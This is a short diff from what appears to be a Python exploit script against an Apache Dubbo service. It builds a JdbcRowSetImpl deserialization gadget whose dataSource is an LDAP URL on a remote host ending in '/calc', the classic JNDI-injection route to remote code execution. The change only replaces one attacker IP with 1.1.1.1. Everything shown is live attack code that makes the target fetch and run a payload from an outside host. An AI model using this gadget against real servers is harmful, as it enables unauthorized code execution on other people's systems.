@@ -10,7 +10,7 @@ client = DubboClient('127.0.0.1', 12347)
 
 JdbcRowSetImpl=new_object(
       'com.sun.rowset.JdbcRowSetImpl',
-      dataSource="ldap://125.88.146.147:1099/calc",
+      dataSource="ldap://1.1.1.1:1099/calc",
       strMatchColumns=["foo"]
       )
 JdbcRowSetImplClass=new_object(
